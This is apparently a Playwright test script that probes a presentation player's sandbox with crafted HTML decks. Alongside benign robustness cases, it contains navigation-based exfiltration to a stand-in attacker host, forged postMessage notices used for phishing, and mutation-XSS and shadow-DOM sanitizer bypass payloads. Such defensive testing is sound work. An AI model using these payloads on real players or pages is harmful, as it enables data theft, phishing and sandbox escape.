// EXP5: single-purpose packages. Each shows how the player reacts to one behavior:
// benign runtime errors, navigation attempts, forged protocol messages, sanitizer differentials,
// and interaction patterns that AI-written decks commonly use.
const fs = require('node:fs'); const path = require('node:path');
const { chromium } = require('playwright'); const L = require('./lib.cjs');

const EVIL = 'http://localhost:4401'; const SAME = 'http://127.0.0.1:4400';
const page1 = (bodyHtml, script = '', head = '') => `<!doctype html><html lang="en"><head><style>body{font:18px system-ui;padding:30px}</style>${head}</head><body>${bodyHtml}<script>${script}</script></body></html>`;
const afterReady = (code, delay = 900) => `window.addEventListener('load',()=>setTimeout(()=>{${code}},${delay}));`;
const mute = `window.addEventListener('securitypolicyviolation',e=>{(window.__v=window.__v||[]).push(e.effectiveDirective+' <- '+e.blockedURI);e.stopImmediatePropagation()},true);`;
const tokenJs = `(document.scripts[0].textContent.match(/\\)\\("([a-f0-9]{36})"\\)/)||[])[1]`;

const cases = [
  // --- how fragile is playback? -----------------------------------------------------------
  { id: 'benign-late-uncaught-error', html: page1('<h1>Deck with one late bug</h1>', afterReady(`throw new Error('benign late error in an animation callback')`)) },
  { id: 'benign-unhandled-rejection', html: page1('<h1>Deck with a rejected promise</h1>', afterReady(`Promise.reject(new Error('optional analytics module failed'))`)) },
  { id: 'console-error-only', html: page1('<h1>Deck that logs console.error</h1>', afterReady(`console.error('just a log')`)) },
  { id: 'click-handler-throws', html: page1('<h1>Deck</h1><button id="b">Break</button><output id="o">alive</output>', `document.getElementById('b').addEventListener('click',()=>{null.x})`), act: async (frame) => { await frame.locator('#b').click(); } },
  { id: 'broken-inline-image', html: page1('<h1>Deck with one corrupt embedded picture</h1><img alt="broken" src="data:image/png;base64,AAAA">') },
  { id: 'runtime-img-external', html: page1('<h1>Deck adds an external image at runtime</h1>', afterReady(`const i=new Image();i.src='${EVIL}/runtime.png';document.body.append(i)`)) },
  { id: 'css-google-fonts-import', html: page1('<h1>Deck whose CSS imports a web font</h1>', '', `<style>@import url("${EVIL}/css2?family=Inter");h1{font-family:Inter,sans-serif}</style>`) },
  { id: 'css-font-face-url', html: page1('<h1>Deck with @font-face url()</h1>', '', `<style>@font-face{font-family:Deck;src:url("${EVIL}/deck.woff2")}h1{font-family:Deck,sans-serif}</style>`) },
  { id: 'css-background-url', html: page1('<h1 style="height:200px">Deck with a CSS background url()</h1>', '', `<style>h1{background:url("images/bg.png")}</style>`) },
  { id: 'fetch-local-json', html: page1('<h1>Deck fetches ./data.json</h1><output id="o">loading</output>', `fetch('./data.json').then(r=>r.json()).then(d=>{document.getElementById('o').textContent=d.ok}).catch(e=>{document.getElementById('o').textContent='caught: '+e.message})`), files: { 'data.json': '{"ok":"data loaded"}' } },
  { id: 'crypto-and-timers-ok', html: page1('<h1>Deck</h1><output id="o"></output>', `let n=0;setInterval(()=>{document.getElementById('o').textContent=crypto.randomUUID().slice(0,8)+' tick '+(++n)},200)`), settle: 1500 },
  // --- interaction patterns ------------------------------------------------------------------
  { id: 'inline-onclick-attribute', html: page1('<h1>Deck using onclick=""</h1><button id="b" onclick="document.getElementById(\'o\').textContent=\'clicked\'">Click</button> <output id="o">not clicked</output>'), act: async (frame) => { await frame.locator('#b').click(); }, read: () => ({ output: document.getElementById('o').textContent, hasOnclickAttr: document.getElementById('b').hasAttribute('onclick') }) },
  { id: 'alert-then-update', html: page1('<h1>Deck using alert()</h1><button id="b">Quiz</button> <output id="o">-</output>', `document.getElementById('b').addEventListener('click',()=>{const answer=prompt('2+2?');alert('You said '+answer);document.getElementById('o').textContent='answer='+answer})`), act: async (frame) => { await frame.locator('#b').click(); }, read: () => ({ output: document.getElementById('o').textContent }) },
  { id: 'js-form-submit-handler', html: page1('<h1>Deck with a JS form</h1><form id="f"><input id="i" value="42"><button id="s" type="submit">Check</button></form><output id="o">not submitted</output>', `document.getElementById('f').addEventListener('submit',e=>{e.preventDefault();document.getElementById('o').textContent='submitted '+document.getElementById('i').value})`), act: async (frame) => { await frame.locator('#s').click(); await frame.locator('#i').press('Enter'); }, read: () => ({ output: document.getElementById('o').textContent }) },
  { id: 'external-link-and-anchor', html: page1('<h1 id="top">Deck with links</h1><a id="ext" href="https://example.com/paper.pdf" target="_blank">reference</a> <a id="int" href="#/2">slide 2</a><output id="o">-</output>', `addEventListener('hashchange',()=>{document.getElementById('o').textContent='hashchange '+location.hash})`), act: async (frame) => { await frame.locator('#int').click(); await frame.locator('#ext').click(); }, read: () => ({ extHref: document.getElementById('ext').getAttribute('href'), extTarget: document.getElementById('ext').getAttribute('target'), intHref: document.getElementById('int').getAttribute('href'), hash: location.hash, output: document.getElementById('o').textContent }) },
  { id: 'box-sizing-and-scroll-fidelity', html: page1('<div id="box" style="width:200px;padding:50px;background:#ddd">box</div><div style="height:3000px">tall</div><p id="end">end</p>'), read: () => ({ boxOffsetWidth: document.getElementById('box').offsetWidth, boxSizing: getComputedStyle(document.getElementById('box')).boxSizing, bodyOverflow: getComputedStyle(document.body).overflow, htmlOverflow: getComputedStyle(document.documentElement).overflow, bodyMargin: getComputedStyle(document.body).margin, scrollHeight: document.documentElement.scrollHeight, innerHeight }) },
  { id: 'srcset-and-picture', html: page1('<h1>Deck with srcset</h1><img id="i" alt="x" srcset="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== 1x"><picture><source id="s" srcset="images/a.webp" type="image/webp"><img id="p" alt="y" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></picture>'), read: () => ({ imgHasSrcset: document.getElementById('i').hasAttribute('srcset'), imgNaturalWidth: document.getElementById('i').naturalWidth, sourceHasSrcset: document.getElementById('s').hasAttribute('srcset') }) },
  // --- navigation ---------------------------------------------------------------------------
  { id: 'selfnav-http', html: page1('<h1>navigates its own frame to an attacker URL</h1>', afterReady(`location.href='${EVIL}/selfnav?leak=SECRET1'`)) },
  { id: 'selfnav-same-origin', html: page1('<h1>navigates its own frame to the site</h1>', afterReady(`location.href='${SAME}/about/?leak=SECRET2'`)) },
  { id: 'meta-refresh-dynamic', html: page1('<h1>meta refresh</h1>', afterReady(`const m=document.createElement('meta');m.httpEquiv='refresh';m.content='0;url=${EVIL}/refresh?leak=SECRET3';document.head.append(m)`)) },
  { id: 'parentnav-evil', html: page1('<h1>navigates the runner frame to an attacker URL</h1>', afterReady(`try{parent.location.replace('${EVIL}/parentnav?leak=SECRET4');window.__nav='called'}catch(e){window.__nav='THROW '+e.name+': '+e.message}`)), settle: 3500 },
  { id: 'parentnav-same-origin-runner', html: page1('<h1>navigates the runner frame to a same-origin URL carrying data</h1>', afterReady(`try{parent.location.replace('${SAME}/presentation-sandbox.html?leak=SECRET5-'+encodeURIComponent(document.querySelector('h1').textContent));window.__nav='called'}catch(e){window.__nav='THROW '+e.name+': '+e.message}`)), settle: 3500, shot: true },
  { id: 'parentnav-same-origin-editor', html: page1('<h1>replaces the runner with the editor itself</h1>', afterReady(`parent.location.replace('${SAME}/?leak=SECRET6')`)), settle: 5000, shot: true },
  // --- forged protocol messages -----------------------------------------------------------------
  { id: 'forged-error-text', html: page1('<h1>spoofs a host notice</h1>', afterReady(`parent.postMessage({qftPresentation:1,token:${tokenJs},kind:'error',detail:'Your session expired. To restore your drafts, sign in again at https://qft-login.example/restore'},'*')`)), shot: true },
  { id: 'forged-ready-then-hang-free', html: page1('<h1>claims ready early</h1>', `parent.postMessage({qftPresentation:1,token:${tokenJs},kind:'ready'},'*');window.__sentEarly=true`) },
  // --- sanitizer differentials (violations muted so the DOM can be inspected) --------------------
  { id: 'mxss-noscript', html: page1(`<h1>noscript differential</h1><noscript><p title="</noscript><img id=mx src=${EVIL}/mxss.png onerror=window.__mxss=1><a id=mxa href=https://evil.example/ target=_blank>x</a>"></p></noscript>`, '', `<script>${mute}</script>`), settle: 1500, read: () => { const i = document.getElementById('mx'); const a = document.getElementById('mxa'); return { smuggledImg: !!i, imgSrc: i && i.getAttribute('src'), imgHasOnerror: i && i.hasAttribute('onerror'), onerrorRan: !!window.__mxss, smuggledLinkHref: a && a.getAttribute('href'), smuggledLinkTarget: a && a.getAttribute('target'), violations: window.__v }; } },
  { id: 'declarative-shadow-dom', html: page1(`<h1>template contents are not inspected</h1><div id="host"><template shadowrootmode="open"><img id="si" src="${EVIL}/dsd.png" onerror="window.__dsd=1"><iframe id="sf" src="${EVIL}/dsd-frame"></iframe><link rel="stylesheet" href="${EVIL}/dsd.css"><a id="sa" href="https://evil.example/" target="_blank">x</a></template></div>`, '', `<script>${mute}</script>`), settle: 1500, read: () => { const root = document.getElementById('host').shadowRoot; return { shadowRoot: !!root, img: root && root.getElementById('si') && root.getElementById('si').getAttribute('src'), imgOnerrorAttr: root && root.getElementById('si') && root.getElementById('si').hasAttribute('onerror'), onerrorRan: !!window.__dsd, iframe: root && !!root.getElementById('sf'), link: root && !!root.querySelector('link'), anchorHref: root && root.getElementById('sa') && root.getElementById('sa').getAttribute('href'), violations: window.__v }; } },
  { id: 'history-entries', html: page1('<h1>history</h1>', afterReady(`for(let i=1;i<=5;i++)history.pushState(null,'','#/'+i);window.__len=history.length`)), settle: 2000, read: () => ({ frameHistoryLength: history.length, hash: location.hash }) },
];

(async () => {
  const only = process.argv.slice(2);
  const site = await L.startSite(4400); const evil = await L.startEvil(4401);
  const browser = await chromium.launch();
  const results = [];
  try {
    for (const item of cases) {
      if (only.length && !only.some((key) => item.id.includes(key))) continue;
      const context = await browser.newContext({ viewport: { width: 1300, height: 900 } });
      const page = await context.newPage();
      const consoleErrors = []; const dialogs = []; const popups = [];
      page.on('console', (m) => { if (m.type() === 'error') consoleErrors.push(m.text().slice(0, 240)); });
      page.on('dialog', async (d) => { dialogs.push(`${d.type()}: ${d.message()}`); await d.dismiss().catch(() => {}); });
      context.on('page', (p) => popups.push(p.url()));
      await L.openWorkspace(page, `${SAME}/`);
      const hostHistoryBefore = await page.evaluate(() => history.length);
      await L.openFile(page, L.makePackage(item.html, { files: item.files || {} }), `${item.id}.zip`);
      await page.locator('[data-pres-start-button]').waitFor({ state: 'visible', timeout: 15000 });
      const evilBefore = evil.log.length; const siteBefore = site.log.length;
      const t0 = Date.now();
      await page.locator('[data-pres-start-button]').click();
      const timeline = []; let last = '';
      const sample = async () => { const s = await L.dialogState(page); const key = `${s.status}|${s.notice}|${s.frames}`; if (key !== last) { last = key; timeline.push({ ms: Date.now() - t0, status: s.status, notice: s.notice, frames: s.frames }); } return s; };
      await L.until(async () => { const s = await sample(); return s.status !== 'Opening presentation…' && s.status !== 'Ready to start'; }, 'leave loading', 25000, 100).catch(() => {});
      let acted = null;
      if (item.act) { const frame = L.appFrame(page); if (frame) { try { await item.act(frame); acted = 'ok'; } catch (error) { acted = `act failed: ${error.message.split('\n')[0]}`; } } else acted = 'no frame'; }
      const settle = item.settle ?? 2500;
      const end = Date.now() + settle; while (Date.now() < end) { await sample(); await L.sleep(120); }
      const frame = L.appFrame(page);
      let read = null;
      if (item.read && frame) read = await frame.evaluate(item.read).catch((error) => `read failed: ${error.message.split('\n')[0]}`);
      const nav = frame ? await frame.evaluate(() => window.__nav ?? null).catch(() => null) : null;
      const final = await L.dialogState(page);
      const frames = page.frames().map((f) => f.url().slice(0, 90));
      const record = { id: item.id, timeline, final: { status: final.status, notice: final.notice, frames: final.frames, startOverlayHidden: final.startOverlayHidden }, acted, read, nav, frames, evil: evil.log.slice(evilBefore).map((e) => `${e.method} ${e.url}`), siteRequests: site.log.slice(siteBefore).map((e) => `${e.method} ${e.url} dest=${e.dest}`), hostHistory: [hostHistoryBefore, await page.evaluate(() => history.length)], dialogs, popups, consoleErrors: consoleErrors.slice(0, 6) };
      results.push(record);
      if (item.shot) await page.screenshot({ path: path.join(__dirname, 'shots', `exp5-${item.id}.png`) });
      console.log(`\n### ${item.id}`);
      console.log('  timeline:', timeline.map((t) => `${t.ms}ms ${t.status}${t.notice ? ` | notice="${t.notice}"` : ''} | frames=${t.frames}`).join('\n            '));
      if (acted) console.log('  act:', acted);
      if (read) console.log('  inside frame:', JSON.stringify(read));
      if (nav) console.log('  nav call:', nav);
      console.log('  frames:', JSON.stringify(frames));
      if (record.evil.length) console.log('  !!! ATTACKER SERVER RECEIVED:', record.evil);
      const interesting = record.siteRequests.filter((r) => !/_astro|presentation-sandbox\.html dest=iframe$/.test(r) || /leak/.test(r));
      if (interesting.length) console.log('  same-origin requests:', interesting);
      if (record.hostHistory[0] !== record.hostHistory[1]) console.log('  host history.length:', record.hostHistory.join(' -> '));
      if (dialogs.length || popups.length) console.log('  dialogs/popups:', dialogs, popups);
      if (consoleErrors.length) console.log('  console:', consoleErrors.slice(0, 3));
      await context.close();
    }
  } finally {
    await browser.close(); await Promise.all([site.close(), evil.close()]);
    fs.writeFileSync(path.join(__dirname, 'logs', `exp5-kills${only.length ? '-' + only.join('_') : ''}.json`), JSON.stringify(results, null, 2));
  }
})().catch((e) => { console.error(e); process.exit(1); });
